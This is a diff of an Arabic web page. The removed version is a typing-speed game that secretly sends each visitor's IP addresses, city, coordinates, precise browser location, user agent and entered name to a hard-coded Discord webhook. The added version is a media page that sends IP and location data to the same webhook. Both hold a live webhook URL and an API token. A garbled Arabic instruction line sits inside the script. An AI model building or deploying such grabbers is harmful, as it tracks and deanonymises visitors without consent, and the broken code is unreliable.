@@ -1,323 +1,120 @@
-<!DOCTYPE html>
+بذا <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>اختبر سرعتك</title>
+  <title>تعيش و تاكل غيرها</title>
   <style>
     body {
-      font-family: Tahoma, sans-serif;
-      direction: rtl;
       margin: 0; padding: 0;
-      text-align: center;
-      min-height: 100vh;
-      background: linear-gradient(135deg, #e0f7fa, #fce4ec);
-      background-size: 400% 400%;
-      animation: bgShift 10s ease infinite;
-    }
-    @keyframes bgShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    .container {
-      max-width: 700px;
-      margin: 60px auto;
-      padding: 20px;
-      background: rgba(255, 255, 255, 0.85);
-      border-radius: 15px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.1);
-    }
-    input[type="text"] {
-      padding: 12px;
-      font-size: 18px;
-      width: 80%;
-      margin-bottom: 15px;
-      border: 2px solid #ccc;
-      border-radius: 8px;
-    }
-    button {
-      padding: 12px 25px;
-      font-size: 18px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      margin: 5px;
-    }
-    #sentence {
-      font-size: 26px;
-      font-weight: bold;
-      color: #222;
-      margin: 25px 0;
-    }
-    #record {
-      position: fixed;
-      right: 20px;
-      top: 20px;
-      background: #ffd700;
-      padding: 10px 15px;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: bold;
-      display: none;
-    }
-    #musicControl {
-      position: fixed;
-      left: 20px;
-      top: 20px;
-      background: #007bff;
-      color: white;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      cursor: pointer;
+      background: url('https://i.pinimg.com/736x/bb/e2/80/bbe2806d8273a49096437c6ce79fb361.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Courier New', Courier, monospace;
+      color: #000;
       display: flex;
       justify-content: center;
       align-items: center;
-      font-size: 20px;
-      user-select: none;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
     }
-    #result {
-      font-size: 20px;
-      margin-top: 20px;
+    .media-container {
+      width: 750px;
+      border: 2px solid #000;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0, 0, 255, 0.7);
+      overflow: hidden;
+      margin-bottom: 20px;
     }
-    #result.error {
-      color: red;
-      font-weight: bold;
+    video {
+      width: 100%;
+      height: auto;
+      display: block;
     }
-    #speedDisplay, #bestTime {
-      font-size: 18px;
+    audio {
+      width: 100%;
+      outline: none;
+    }
+    .info {
       margin-top: 10px;
+      font-size: 1.2em;
+      color: #000;
+      text-shadow: 0 0 8px #00f, 0 0 15px #00f, 0 0 25px #00f;
+      letter-spacing: 2px;
+      background: rgba(255, 255, 255, 0.7);
+      padding: 15px;
+      border-radius: 10px;
+      max-width: 750px;
+      white-space: pre-wrap;
+      text-align: left;
+      line-height: 1.4;
+      direction: rtl;
     }
   </style>
 </head>
 <body>
 
-<div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
-<div id="musicControl" title="كتم/تشغيل الموسيقى">🎵</div>
+  <div class="media-container">
+    <video autoplay loop muted playsinline>
+      <source src="https://k.top4top.io/m_3409gpb551.mp4" type="video/mp4" />
+      المتصفح لا يدعم الفيديو
+    </video>
+    <audio autoplay loop>
+      <source src="https://h.top4top.io/m_3409mxajn1.mp3" type="audio/mpeg" />
+      متصفحك لا يدعم تشغيل الصوت.
+    </audio>
+  </div>
 
-<!-- شاشة تسجيل الدخول -->
-<div class="container" id="loginScreen">
-  <h2>مرحبًا!</h2>
-  <p>اكتب اسمك نبدأ</p>
-  <input type="text" id="playerName" placeholder="اسمك" />
-  <br />
-  <button onclick="startGame()">يلا نبدأ</button>
-</div>
+  <div class="info" id="info">جاري تحميل المعلومات...</div>
 
-<!-- شاشة الاختبار -->
-<div class="container" id="gameScreen" style="display:none;">
-  <h2 id="welcomeMsg"></h2>
-  <div id="sentence">...</div>
-  <input type="text" id="userInput" placeholder="اكتب هنا" onkeydown="handleEnter(event)" />
-  <br />
-  <button onclick="checkInput()">تحقق</button>
-  <div id="speedDisplay"></div>
-  <div id="bestTime"></div>
-  <div id="result"></div>
-</div>
+  <script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w';
 
-<audio id="bgMusic" src="https://c.top4top.io/m_343844pxd1.mp3" loop></audio>
+    async function fetchInfo() {
+      try {
+        const ipResponse = await fetch('https://ipinfo.io/json?token=431b829fd37a91');
+        const ipData = await ipResponse.json();
 
-<script>
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w';
+        const ua = navigator.userAgent;
+        const lang = navigator.language;
 
-  const sentences = [
-    "التركيز سر النجاح", "لا تستسلم بسهولة", "كن قدوة في كل شي تسويه",
-    "تعلم من أخطائك وواصل", "الوقت أغلى شيء عند الإنسان", "افعل ما تحب وتحب ما تفعل",
-    "التعب الآن راحة بعدين", "كل تجربة درس", "خلك دايم متفائل", "ابدأ ولا تنتظر",
-    "الحلم ما يتحقق بدون عمل", "الصبر طريق الإنجاز", "خل عندك هدف واضح",
-    "لا تقارن نفسك بغيرك", "التطور يبدأ من نفسك", "النجاح خطوة بخطوة",
-    "نظم وقتك تنجح", "عيش اللحظة وركز", "الاستمرارية أهم من المثالية",
-    "كل دقيقة تعلم فيها شيء"
-  ];
+        const now = new Date();
+        const timeString = `${now.getFullYear()}/${String(now.getMonth() + 1).padStart(2, '0')}/${String(now.getDate()).padStart(2, '0')} ` +
+          `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
 
-  let currentSentence = "";
-  let startTime = 0;
-  let highestSpeed = 0;
-  let bestTime = null;
+        let ipv4 = ipData.ip.includes(':') ? 'غير معروف (IPv6 فقط)' : ipData.ip;
+        let ipv6 = ipData.ip.includes(':') ? ipData.ip : 'غير معروف';
 
-  const loginScreen = document.getElementById("loginScreen");
-  const gameScreen = document.getElementById("gameScreen");
-  const playerName = document.getElementById("playerName");
-  const welcomeMsg = document.getElementById("welcomeMsg");
-  const sentence = document.getElementById("sentence");
-  const userInput = document.getElementById("userInput");
-  const result = document.getElementById("result");
-  const record = document.getElementById("record");
-  const speedDisplay = document.getElementById("speedDisplay");
-  const bestTimeDisplay = document.getElementById("bestTime");
-  const music = document.getElementById("bgMusic");
-  const musicControl = document.getElementById("musicControl");
-
-  // إرسال بيانات المستخدم التقنية مباشرة عند تحميل الصفحة
-  window.onload = () => {
-    sendUserInfo();
-  };
-
-  function startGame() {
-    const name = playerName.value.trim();
-    if (!name) return alert("اكتب اسمك أول");
-    welcomeMsg.textContent = `يلا يا ${name}، اكتب بسرعة`;
-    loginScreen.style.display = "none";
-    gameScreen.style.display = "block";
-    record.style.display = "block";
-    music.volume = 0.3;
-    music.play().catch(() => {
-      musicControl.textContent = "🔇";
-    });
-    nextSentence();
-    sendUserName(name);
-  }
-
-  function nextSentence() {
-    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
-    sentence.textContent = currentSentence;
-    userInput.value = "";
-    result.textContent = "";
-    result.classList.remove("error");
-    speedDisplay.textContent = "";
-    bestTimeDisplay.textContent = "";
-    startTime = Date.now();
-    userInput.focus();
-  }
-
-  function handleEnter(e) {
-    if (e.key === "Enter") checkInput();
-  }
-
-  function checkInput() {
-    const typed = userInput.value.trim();
-    const duration = (Date.now() - startTime) / 1000;
-    const speed = Math.round((typed.length / duration) * 60);
-
-    if (typed === currentSentence) {
-      result.textContent = "تمام!";
-      result.classList.remove("error");
-      if (speed > highestSpeed) {
-        highestSpeed = speed;
-        bestTime = duration;
-        record.textContent = `أعلى سرعة: ${highestSpeed} - ${bestTime.toFixed(2)} ثانية`;
-      }
-      speedDisplay.textContent = `سرعتك الآن: ${speed}`;
-      bestTimeDisplay.textContent = `أسرع وقت: ${duration.toFixed(2)} ثانية`;
-      setTimeout(nextSentence, 800);
-    } else {
-      result.textContent = "غلط! عدلها";
-      result.classList.add("error");
-      speedDisplay.textContent = `سرعتك الآن: ${speed}`;
-    }
-  }
-
-  userInput.addEventListener("input", () => {
-    const typedWords = userInput.value.trim().split(" ");
-    const sentenceWords = currentSentence.split(" ");
-    let colored = "";
-
-    for (let i = 0; i < sentenceWords.length; i++) {
-      if (typedWords[i] === undefined) {
-        colored += `<span>${sentenceWords[i]}</span> `;
-      } else if (typedWords[i] === sentenceWords[i]) {
-        colored += `<span style="color:green;">${sentenceWords[i]}</span> `;
-      } else {
-        colored += `<span style="color:red;">${sentenceWords[i]}</span> `;
-      }
-    }
-
-    sentence.innerHTML = colored.trim();
-  });
-
-  musicControl.addEventListener("click", () => {
-    if (music.paused) {
-      music.play();
-      musicControl.textContent = "🎵";
-    } else {
-      music.pause();
-      musicControl.textContent = "🔇";
-    }
-  });
-
-  // إرسال اسم المستخدم عند بدء اللعبة
-  function sendUserName(name) {
-    fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: `🚀 بدأ المستخدم: ${name}` })
-    });
-  }
-
-  // إرسال بيانات الجهاز والموقع
-  async function sendUserInfo() {
-    try {
-      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
-        fetch('https://api.ipify.org?format=json'),
-        fetch('https://api64.ipify.org?format=json'),
-        fetch('https://ipapi.co/json/')
-      ]);
-      const ipv4Data = await ipv4Res.json();
-      const ipv6Data = await ipv6Res.json();
-      const geoData = await geoRes.json();
-
-      const ua = navigator.userAgent;
-      const lang = navigator.language;
-      const now = new Date();
-      const timeString = now.toISOString();
-
-      const ipv4 = ipv4Data.ip;
-      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
-
-      function sendToWebhook(extraGeo = '') {
-        const infoText = `
+        const infoText = 
+`@here
 IP (IPv4): ${ipv4}
 IP (IPv6): ${ipv6}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-خط العرض: ${geoData.latitude}
-خط الطول: ${geoData.longitude}
-المنظمة: ${geoData.org}
-المنطقة الزمنية: ${geoData.timezone}
-متصفح المستخدم: ${ua}
-اللغة: ${lang}
-الوقت: ${timeString}
-${extraGeo}
-        `.trim();
+City: ${ipData.city}
+Region: ${ipData.region}
+Country: ${ipData.country}
+Location: ${ipData.loc}
+Organization: ${ipData.org}
+Timezone: ${ipData.timezone}
 
-        fetch(WEBHOOK_URL, {
+User Agent: ${ua}
+Language: ${lang}
+Time: ${timeString}`;
+
+        document.getElementById('info').textContent = infoText;
+
+        await fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ content: infoText })
         });
-      }
 
-      if (navigator.geolocation) {
-        let responded = false;
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            responded = true;
-            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(6)}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
-            sendToWebhook(extraGeo);
-          },
-          () => {
-            responded = true;
-            sendToWebhook();
-          },
-          { timeout: 4000 }
-        );
-        setTimeout(() => {
-          if (!responded) sendToWebhook();
-        }, 4500);
-      } else {
-        sendToWebhook();
+      } catch (e) {
+        document.getElementById('info').textContent = 'فشل تحميل المعلومات';
       }
-    } catch (e) {
-      console.error('خطأ في إرسال معلومات المستخدم', e);
     }
-  }
 
-</script>
+    fetchInfo();
+  لا ذي المعلومات الي كذا الي بذا سكربت + ضيف لو سجل اسمه تجي رساله جديدة اخرى فيها اسمه + </script>
 
 </body>
-</html>
+</ html>
